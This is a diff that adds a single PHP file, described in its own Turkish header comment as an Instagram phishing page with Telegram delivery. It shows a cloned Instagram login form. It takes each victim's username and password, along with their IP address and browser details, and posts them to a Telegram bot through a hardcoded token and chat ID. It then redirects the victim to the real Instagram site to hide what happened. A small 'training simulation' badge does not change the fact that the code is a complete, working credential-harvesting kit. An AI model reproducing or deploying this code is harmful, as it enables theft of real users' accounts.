@@ -1,0 +1,263 @@
+<?php
+// ============================================================
+// index.html - Instagram Phishing + Telegram (TEK DOSYA)
+// Uzantı: .html  |  Çalışma: .htaccess ile PHP desteği
+// Bot bilgilerin önceden eklendi.
+// ============================================================
+
+$botToken = '8604225952:AAHoULyCnrkSQ1Pqjo3xa6UlZgwo7H5ObRA';
+$chatID   = '1636656252';
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $username = isset($_POST['username']) ? trim($_POST['username']) : '';
+    $password = isset($_POST['password']) ? trim($_POST['password']) : '';
+    $response = ['status' => 'error', 'message' => ''];
+
+    if ($username !== '' && $password !== '') {
+        $ip         = $_SERVER['REMOTE_ADDR'] ?? 'Bilinmiyor';
+        $userAgent  = $_SERVER['HTTP_USER_AGENT'] ?? 'Bilinmiyor';
+        $date       = date('Y-m-d H:i:s');
+
+        $message  = "🔐 YENİ INSTAGRAM GİRİŞ BİLGİSİ 🔐\n\n";
+        $message .= "👤 Kullanıcı: $username\n";
+        $message .= "🔑 Şifre: $password\n";
+        $message .= "🕒 Tarih: $date\n";
+        $message .= "🌐 IP: $ip\n";
+        $message .= "📱 User-Agent: $userAgent\n";
+        $message .= "-----------------------------\n";
+        $message .= "✅ Otomatik gönderim başarılı.";
+
+        $url = "https://api.telegram.org/bot$botToken/sendMessage";
+        $postData = [
+            'chat_id' => $chatID,
+            'text'    => $message,
+            'parse_mode' => 'HTML'
+        ];
+
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+        $result = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+
+        if ($httpCode === 200 && $result !== false) {
+            $response['status']  = 'success';
+            $response['message'] = 'Giriş başarılı, yönlendiriliyorsunuz...';
+        } else {
+            $response['status']  = 'error';
+            $response['message'] = 'Telegram bağlantı hatası, lütfen tekrar dene.';
+        }
+    } else {
+        $response['status']  = 'error';
+        $response['message'] = 'Lütfen tüm alanları doldurun.';
+    }
+
+    if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
+        header('Content-Type: application/json');
+        echo json_encode($response);
+        exit;
+    }
+
+    if ($response['status'] === 'success') {
+        header('Location: https://www.instagram.com/accounts/login/');
+        exit;
+    } else {
+        $errorMessage = $response['message'];
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - Giriş Yap</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            max-width: 380px;
+            width: 100%;
+            padding: 30px 25px;
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 12px;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+        }
+        .logo {
+            font-size: 48px;
+            font-weight: 700;
+            font-family: 'Segoe UI', cursive;
+            margin-bottom: 25px;
+            color: #262626;
+            letter-spacing: -1px;
+        }
+        .logo span { color: #0095f6; }
+        input {
+            width: 100%;
+            padding: 14px 12px;
+            margin: 6px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            background: #fafafa;
+            font-size: 14px;
+            outline: none;
+            transition: border 0.2s;
+        }
+        input:focus {
+            border-color: #a8a8a8;
+            background: white;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            margin-top: 12px;
+            background: #0095f6;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.2s, opacity 0.2s;
+        }
+        button:hover { background: #1877f2; }
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .error {
+            color: #ed4956;
+            font-size: 14px;
+            margin-top: 14px;
+            display: none;
+            background: #fde8ea;
+            padding: 10px;
+            border-radius: 6px;
+        }
+        .error.show { display: block; }
+        .footer {
+            margin-top: 22px;
+            font-size: 13px;
+            color: #8e8e8e;
+        }
+        .footer a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .footer a:hover { text-decoration: underline; }
+        .simulation-badge {
+            margin-top: 18px;
+            font-size: 11px;
+            color: #bbb;
+            letter-spacing: 0.5px;
+        }
+        .spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.7s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        <?php if (isset($errorMessage)): ?>
+        .error { display: block; }
+        <?php endif; ?>
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">Insta<span>gram</span></div>
+
+        <form id="loginForm" method="POST">
+            <input type="text" id="username" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required autocomplete="off">
+            <input type="password" id="password" name="password" placeholder="Şifre" required autocomplete="off">
+            <button type="submit" id="submitBtn">Giriş Yap</button>
+            <div class="error <?php echo isset($errorMessage) ? 'show' : ''; ?>" id="errorMsg">
+                <?php echo isset($errorMessage) ? htmlspecialchars($errorMessage) : '❌ Kullanıcı adı veya şifre hatalı.'; ?>
+            </div>
+        </form>
+
+        <div class="footer">
+            <a href="#">Şifreni mi unuttun?</a> · <a href="#">Kayıt ol</a>
+        </div>
+        <div class="simulation-badge">🔐 Eğitim simülasyonu · güvenlik testi</div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const btn = document.getElementById('submitBtn');
+            const errorDiv = document.getElementById('errorMsg');
+
+            if (!username || !password) {
+                errorDiv.textContent = '❌ Lütfen tüm alanları doldurun.';
+                errorDiv.classList.add('show');
+                return;
+            }
+
+            btn.disabled = true;
+            btn.innerHTML = '<span class="spinner"></span> Giriş yapılıyor...';
+            errorDiv.classList.remove('show');
+
+            const formData = new FormData();
+            formData.append('username', username);
+            formData.append('password', password);
+
+            fetch(window.location.href, {
+                method: 'POST',
+                headers: {
+                    'X-Requested-With': 'XMLHttpRequest'
+                },
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    window.location.href = 'https://www.instagram.com/accounts/login/';
+                } else {
+                    errorDiv.textContent = data.message || '❌ Bir hata oluştu, lütfen tekrar deneyin.';
+                    errorDiv.classList.add('show');
+                    btn.disabled = false;
+                    btn.innerHTML = 'Giriş Yap';
+                }
+            })
+            .catch(err => {
+                errorDiv.textContent = '❌ Bağlantı hatası, lütfen tekrar deneyin.';
+                errorDiv.classList.add('show');
+                btn.disabled = false;
+                btn.innerHTML = 'Giriş Yap';
+                console.error('Fetch error:', err);
+            });
+        });
+    </script>
+</body>
+</html>
